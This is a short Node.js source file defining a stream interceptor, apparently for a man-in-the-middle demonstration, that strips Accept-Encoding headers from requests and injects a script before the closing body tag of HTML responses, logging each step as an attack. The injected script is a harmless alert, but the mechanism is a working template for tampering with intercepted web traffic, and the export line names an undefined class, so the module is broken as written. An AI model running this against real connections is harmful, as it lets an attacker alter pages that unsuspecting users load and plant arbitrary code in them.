const { Transform } = require('stream');

class Interceptor extends Transform {
    constructor(options = {}) {
        super();
        this.type = options.type || 'upload'; // 'upload' or 'download'
    }

    _transform(chunk, encoding, callback) {
        let rawData = chunk.toString();

        // -- Handle Requests (Upload) --
        // Goal: Remove "Accept-Encoding" so server sends plain text HTML
        if (this.type === 'upload') {
            if (rawData.includes('Accept-Encoding')) {
                console.log('--- [ATTACK] Downgrading Request (Disabling Compression) ---');
                // Regex to remove Accept-Encoding header entirely
                rawData = rawData.replace(/Accept-Encoding:.*\r\n/gi, '');
            }
        }

        // -- Handle Responses (Download) --
        // Goal: Inject our malicious script into HTML page
        if (this.type === 'download') {
            // Look for closing </body> tag to inject before it
            if (rawData.includes('</body>')) {
                console.log('--- [ATTACK] Injecting Malicious Script into Response ---');

                const payload = `
                <script>
                    alert('Your system has been compromised!');
                    document.body.style.border = '5px solid red';
                </script>
                </body>`;

                // Replace closing body tag with our payload
                rawData = rawData.replace('</body>', payload);
            }
        }

        // Convert the string back to Buffer and push it forward
        this.push(Buffer.from(rawData));
        callback();
    }
}

module.exports = { Interceptorv2 };